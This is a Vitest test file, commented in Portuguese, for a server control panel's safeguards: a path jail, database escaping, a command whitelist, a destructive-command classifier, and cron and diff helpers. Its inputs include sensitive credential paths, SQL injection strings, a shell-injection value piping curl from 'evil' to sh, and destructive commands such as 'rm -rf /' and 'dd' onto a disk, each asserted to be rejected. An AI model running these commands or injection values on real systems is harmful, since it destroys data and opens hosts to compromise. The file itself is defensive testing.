import { describe, it, expect } from 'vitest';
import { resolveSafePath, PathAccessError, DEFAULT_ALLOWED_ROOTS } from '../lib/paths';
import { mysqlString, pgString, jsString, assertIdentifier, assertPassword, DbInputError } from '../lib/db';
import { assessCommandRisk, needsRollbackGuard } from '../lib/ai/safety';
import { validateCronExpression, nextRuns } from '../lib/cron';
import { unifiedDiff } from '../lib/diff';
import { buildArgv, COMMAND_WHITELIST } from '../lib/system';

/**
 * Testes das barreiras de segurança e das funções de validação.
 * Cada caso corresponde a um vetor que estava aberto no código anterior.
 */

describe('jaula do gerenciador de arquivos', () => {
  it('permite caminhos dentro das raízes configuradas', () => {
    expect(() => resolveSafePath('/var/www/site/index.html')).not.toThrow();
  });

  it('recusa caminhos fora das raízes', () => {
    expect(() => resolveSafePath('/etc/passwd')).toThrow(PathAccessError);
    expect(() => resolveSafePath('/root/.bashrc')).toThrow(PathAccessError);
  });

  it('bloqueia arquivos sensíveis mesmo sob raiz permitida', () => {
    expect(() => resolveSafePath('/etc/shadow')).toThrow(/bloqueado/i);
    expect(() => resolveSafePath('/root/.ssh/authorized_keys')).toThrow(/bloqueado/i);
    expect(() => resolveSafePath('/var/lib/duart-panel/auth/users.json')).toThrow(/bloqueado/i);
  });

  it('normaliza travessia por ..', () => {
    expect(() => resolveSafePath('/var/www/../../etc/shadow')).toThrow(PathAccessError);
  });

  it('recusa caminho com byte nulo', () => {
    expect(() => resolveSafePath('/var/www/x\0.txt')).toThrow(PathAccessError);
  });

  it('respeita raízes customizadas', () => {
    expect(() => resolveSafePath('/opt/app/x', { allowedRoots: ['/srv'] })).toThrow(PathAccessError);
    expect(() => resolveSafePath('/srv/app/x', { allowedRoots: ['/srv'] })).not.toThrow();
  });

  it('tem /var/www entre as raízes padrão', () => {
    expect(DEFAULT_ALLOWED_ROOTS).toContain('/var/www');
  });
});

describe('escape de banco de dados', () => {
  it('neutraliza aspas em literal MySQL', () => {
    // A senha era interpolada crua: `a'; DROP …; #` escapava da string.
    expect(mysqlString("a'; DROP DATABASE x; #")).toBe("'a\\'; DROP DATABASE x; #'");
  });

  it('duplica aspas em literal PostgreSQL', () => {
    expect(pgString("o'brien")).toBe("'o''brien'");
  });

  it('serializa literais do MongoDB como JSON', () => {
    expect(jsString('a"b')).toBe('"a\\"b"');
  });

  it('recusa identificadores com caracteres de shell ou SQL', () => {
    expect(() => assertIdentifier('meu_banco')).not.toThrow();
    expect(() => assertIdentifier('meu banco')).toThrow(DbInputError);
    expect(() => assertIdentifier('x; DROP TABLE y')).toThrow(DbInputError);
    expect(() => assertIdentifier('`x`')).toThrow(DbInputError);
    expect(() => assertIdentifier('')).toThrow(DbInputError);
  });

  it('recusa senha curta ou com quebra de linha', () => {
    expect(() => assertPassword('curta')).toThrow(DbInputError);
    expect(() => assertPassword('senha-boa-1234')).not.toThrow();
    expect(() => assertPassword('linha1\nlinha2xxxx')).toThrow(DbInputError);
  });
});

describe('whitelist de comandos', () => {
  it('não contém curingas que aceitem qualquer argumento', () => {
    // `/^.+$/` na lista do certbot e do journalctl tornava a validação inútil,
    // e o campo de e-mail do formulário de SSL chegava até ali.
    for (const [key, entry] of Object.entries(COMMAND_WHITELIST)) {
      for (const pattern of entry.allowedArgs) {
        expect(pattern.source, `${key} aceita qualquer argumento`).not.toBe('^.+$');
      }
    }
  });

  it('recusa argumento fora do padrão', () => {
    expect(() => buildArgv('systemctl_restart', ['nginx; rm -rf /'])).toThrow(/não permitido/);
    expect(() => buildArgv('systemctl_restart', ['nginx'])).not.toThrow();
  });

  it('recusa e-mail malformado no certbot', () => {
    expect(() => buildArgv('certbot_certonly', ['--email', 'x; curl evil|sh'])).toThrow(/não permitido/);
    expect(() => buildArgv('certbot_certonly', ['--email', 'admin@exemplo.com'])).not.toThrow();
  });

  it('recusa argumentos em comandos que não aceitam nenhum', () => {
    expect(() => buildArgv('nginx_test', ['-c', '/tmp/x'])).toThrow();
  });

  it('devolve argv em array, sem concatenar em string de shell', () => {
    const result = buildArgv('systemctl_restart', ['nginx']);
    expect(Array.isArray(result.args)).toBe(true);
    expect(result.args).toContain('nginx');
  });
});

describe('classificação de risco de comandos', () => {
  it.each([
    'mkfs.ext4 /dev/sda1',
    'dd if=/dev/zero of=/dev/sda',
    'rm -rf /',
    'ufw disable',
    'reboot',
    'userdel deploy',
    'DROP DATABASE producao',
  ])('marca "%s" como irreversível', command => {
    expect(assessCommandRisk(command).irreversible).toBe(true);
  });

  it.each([
    'chown -R www-data:www-data /var/www/site',
    'systemctl reload nginx',
    'ls -la /var/log',
    'tail -n 100 /var/log/nginx/error.log',
  ])('não marca "%s" como irreversível', command => {
    // A lista antiga bloqueava `chown -R`, que é o comando mais comum ao criar
    // um site PHP — atrapalhava o uso legítimo sem impedir o destrutivo.
    expect(assessCommandRisk(command).irreversible).toBe(false);
  });

  it('agenda reversão para comandos que tocam acesso remoto', () => {
    expect(needsRollbackGuard('ufw allow 8080/tcp')).toBe(true);
    expect(needsRollbackGuard('systemctl restart sshd')).toBe(true);
    expect(needsRollbackGuard('ls /tmp')).toBe(false);
  });
});

describe('expressões cron', () => {
  it.each([
    '0 3 * * *',
    '*/5 * * * *',
    '1-5/2 * * * *',
    '0 0 1,15 * *',
    '0 2 * * MON',
    '30 4 1 JAN *',
    '@daily',
    '@reboot',
  ])('aceita "%s"', expression => {
    // A validação anterior recusava passo dentro de intervalo, nomes de mês e
    // dia, e atalhos — o usuário digitava certo e o painel dizia que estava errado.
    expect(validateCronExpression(expression).valid).toBe(true);
  });

  it.each([
    '0 3 * *',
    '60 * * * *',
    '* 25 * * *',
    '@sempre',
    '',
  ])('recusa "%s"', expression => {
    expect(validateCronExpression(expression).valid).toBe(false);
  });

  it('calcula as próximas execuções', () => {
    const runs = nextRuns('0 3 * * *', 2);
    expect(runs).toHaveLength(2);
    expect(new Date(runs[0]).getHours()).toBe(3);
    expect(new Date(runs[1]).getTime()).toBeGreaterThan(new Date(runs[0]).getTime());
  });
});

describe('diff unificado', () => {
  it('reconhece conteúdo idêntico', () => {
    const diff = unifiedDiff('a\nb\n', 'a\nb\n');
    expect(diff.identical).toBe(true);
    expect(diff.text).toBe('');
  });

  it('conta linhas adicionadas e removidas', () => {
    const diff = unifiedDiff('a\nb\nc\n', 'a\nX\nc\n');
    expect(diff.stats).toEqual({ added: 1, removed: 1 });
    expect(diff.text).toContain('-b');
    expect(diff.text).toContain('+X');
  });

  it('trata arquivo novo como adição integral', () => {
    const diff = unifiedDiff('', 'linha1\nlinha2\n');
    expect(diff.stats.added).toBe(2);
    expect(diff.stats.removed).toBe(0);
  });

  it('emite cabeçalho de hunk', () => {
    const diff = unifiedDiff('a\n', 'b\n');
    expect(diff.text).toMatch(/@@ -\d+,\d+ \+\d+,\d+ @@/);
  });
});
